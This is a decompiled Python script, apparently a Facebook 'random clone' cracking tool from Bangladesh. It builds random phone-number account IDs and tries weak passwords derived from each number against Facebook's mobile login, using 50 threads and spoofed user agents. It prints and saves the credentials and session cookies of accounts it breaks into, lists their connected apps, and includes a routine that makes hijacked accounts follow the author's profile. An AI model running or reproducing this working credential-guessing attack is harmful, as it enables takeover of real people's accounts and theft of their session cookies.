#Decompile by Mardis (Tools By LIMON)
# Time Succes decompile : 2023-03-01 06:48:38.657478

import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://m.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
          
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/Lj.LMNx9')
logo = ("""

     \033[0;95m   d88b  .d88b.  db   db d8b   db db    db 
     \033[1;33m   `8P' .8P  Y8. 88   88 888o  88 `8b  d8' 
     \033[1;36m    88  88    88 88ooo88 88V8o 88  `8bd8'  
     \033[1;34m    88  88    88 88~~~88 88 V8o88    88    
     \033[1;31mdb. 88  `8b  d8' 88   88 88  V888    88    
     \033[1;32mY8888P   `Y88P'  YP   YP VP   V8P    YP    
     
     \33[0;41m         𝐈 𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐈𝐓𝐔𝐃𝐄           \033[0;92m                      
                                           
 \033[1;93m⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱[\033[1;32m 𝐀𝐃𝐌𝐈𝐍 𝐈𝐍-𝐏𝐑𝐎 \033[1;93m]⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱
       \033[1;96m[💔] 𝐎𝐰𝐧𝐞𝐫         : \033[1;96m 𝐋𝐈𝐌𝐎𝐍 𝐇𝐎𝐒𝐒𝐀𝐈𝐍     
      \033[1;34m [💔] 𝐅𝐚𝐜𝐞𝐁𝐨𝐨𝐤      : \033[1;34m 𝐋𝐣.𝐋𝐌𝐍𝐱𝟗      
       \033[1;35m[💔] 𝐆𝐢𝐭𝐇𝐮𝐛        :  \033[1;35m𝐋𝐌𝐍𝐱𝟗-𝐉𝐎𝐇𝐍𝐘        
       \033[1;36m[💔] 𝐓𝐨𝐨𝐥 𝐒𝐭𝐮𝐭𝐮𝐬   : \033[1;36m 𝐑𝐚𝐧𝐝𝐨𝐦 𝐂𝐥𝐨𝐧𝐞      
       \033[1;35m[💔] 𝐓𝐞𝐚𝐦          :  \033[1;35  𝐋𝐌𝐍𝐱𝟗-𝐃𝐫𝐊 𝐂𝐲𝐛𝐞𝐫 
       \033[1;36m[💔] 𝐓𝐨𝐨𝐥 𝐕𝐞𝐫𝐬𝐢𝐨𝐧  :  \033[1;36m𝟎.𝟏                 
       \33[0;41m        𝐂𝐘𝐁𝐄𝐑 𝐊𝐈𝐍𝐆 𝐉𝐎𝐇𝐍𝐘          \033[0;92m
                \033[1;32m 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐅𝐨𝐫 𝐌𝐨𝐫𝐞                 \033[1;32m  
                 \033[1;32m      𝐋𝐌𝐍𝐱𝟗         \033[1;32m 
 \033[1;93m⊰᯽⊱┈─╌❊❊╌─┈⊰᯽⊱[\033[1;32m 𝐋𝐌𝐍𝐱𝟗-𝐃𝐫𝐊 𝐂𝐲𝐛𝐞𝐫 \033[1;93m]⊰᯽⊱┈─╌❊❊╌─┈⊰᯽⊱

""")
def linex():
	print('\033[1;93m⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱[\033[1;32m😍 𝐉𝐮𝐢 𝐞𝐫 𝐉𝐚𝐦𝐚𝐢 𝐓𝐚𝐡 😍\033[1;93m]⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱')
	
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/Lj.LMNx9')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :riddu = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :riddu = '√ 2009'
        elif uid[:8] in ['10000000']        :riddu = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:riddu = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:riddu = ' 2010'
        elif uid[:6] in ['100001']          :riddu = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :riddu = '√ 2011/2012'
        elif uid[:6] in ['100004']          :riddu = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :riddu = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :riddu = '√ 2014/2015'
        elif uid[:6] in ['100009']          :riddu = '√ 2015'
        elif uid[:5] in ['10001']           :riddu = '√ 2015/2016'
        elif uid[:5] in ['10002']           :riddu = '√ 2016/2017'
        elif uid[:5] in ['10003']           :riddu = '√ 2018/2019'
        elif uid[:5] in ['10004']           :riddu = '√ 2019/2020'
        elif uid[:5] in ['10005']           :riddu = '√ 2020'
        elif uid[:5] in ['10006','10007','']:riddu = '√ 2021'
        elif uid[:5] in ['10008']           :riddu = '√ 2022'
        elif uid[:5] in ['10009']           :riddu = '√ 2023'
        else:riddu=''
    elif len(uid) in [9,10]:
        riddu = ' √ 2008/2009'
    elif len(uid)==8:
        riddu = '√ 2007/2008'
    elif len(uid)==7:
        riddu = '√ 2006/2007'
    else:riddu=''
    return riddu
    
    
    
def riddu():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;92m 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : {xr}𝟎𝟏𝟗𝟏 • 𝟎𝟏𝟕𝟐 • 𝟎𝟏𝟔𝟓{x}')
    
    print(" \033[1;93m⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱[\033[1;32m😍 𝐉𝐮𝐢 𝐞𝐫 𝐉𝐚𝐦𝐚𝐢 𝐓𝐚𝐡 😍\033[1;93m]⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱")
    
    rk1 = '0191'
    rk2 = '0172'
    rk3 = '0165'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;92m 𝐂𝐡𝐨𝐨𝐬𝐞 : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;92m 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝟏𝟎𝟎𝟎𝟎 • 𝟐𝟎𝟎𝟎𝟎 • 𝟓𝟎𝟎𝟎𝟎 \n \033[1;93m⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱[\033[1;32m😍 𝐉𝐮𝐢 𝐞𝐫 𝐉𝐚𝐦𝐚𝐢 𝐓𝐚𝐡 😍 \033[1;93m]⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱ \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m 𝐏𝐮𝐭 𝐂𝐥𝐨𝐧𝐢𝐧𝐠 𝐋𝐢𝐦𝐢𝐭 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m 𝐄𝐧𝐭𝐞𝐫 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝  {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;94m 𝐓𝐨𝐭𝐚𝐥 𝐈𝐝𝐬: {xr}'+tl)
        print(f'{x} \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;94m 𝐓𝐡𝐞 𝐏𝐫𝐨𝐜𝐜𝐞𝐬 𝐇𝐚𝐬 𝐁𝐞𝐞𝐧 𝐒𝐭𝐚𝐫𝐭𝐞𝐝')
        print(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;94m 𝐖𝐨𝐫𝐤 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 \033[1;97m: \033[1;96m𝐁𝐚𝐧𝐠𝐥𝐚𝐝𝐞𝐬𝐡')
        print(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;94m 𝐓𝐨𝐨𝐥 𝐎𝐰𝐧𝐞𝐫 \033[1;97m: \033[1;96m 𝐋𝐈𝐌𝐎𝐍 𝐇𝐎𝐒𝐒𝐀𝐈𝐍')
        print(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;94m 𝐔𝐬𝐞 𝐍𝐞𝐭𝐰𝐨𝐫𝐤 \033[1;97m:  \033[1;96m𝐎𝐧𝐥𝐲 𝐈𝐩𝐯𝟒 & 𝐈𝐩𝐯𝟔')
        print(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;91m 𝐅𝐨𝐫 𝐁𝐞𝐬𝐭 𝐑𝐞𝐬𝐮𝐥𝐭𝐬 𝐔𝐬𝐞 𝐅𝐥𝐢𝐠𝐡𝐭 𝐌𝐨𝐨𝐝 𝐄𝐯𝐞𝐫𝐲 𝟓 𝐦')
        print(f' \033[1;91m[\033[1;97m💔\033[1;91m]\033[1;92m 𝐓𝐨𝐨𝐥 𝐖𝐨𝐫𝐤 • 𝐃𝐚𝐭𝐚 & 𝐖𝐢𝐟𝐢 ')
        
        print(f" \033[1;93m⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱[\033[1;32m😍 𝐉𝐮𝐢 𝐞𝐫 𝐉𝐚𝐦𝐚𝐢 𝐓𝐚𝐡 😍\033[1;93m]⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱")
        
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
            
    print(f"\n{x} \033[1;93m⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱[\033[1;32m😍 𝐉𝐮𝐢 𝐞𝐫 𝐉𝐚𝐦𝐚𝐢 𝐓𝐚𝐡 😍\033[1;93m]⊰᯽⊱┈──╌❊❊╌─┈⊰᯽⊱")
    
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            
            header_freefb = {"authority": 'm.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://m.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90",   "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=1',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[LMNx9-OK⚡] ' +uid+ ' | ' +ps+    '  \n[‎‎⚡]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/LMNx9-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\033[1;32m[LMNx9-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;92m')
                open('/sdcard/LMNx9-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}LMNx9{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass



riddu()
      
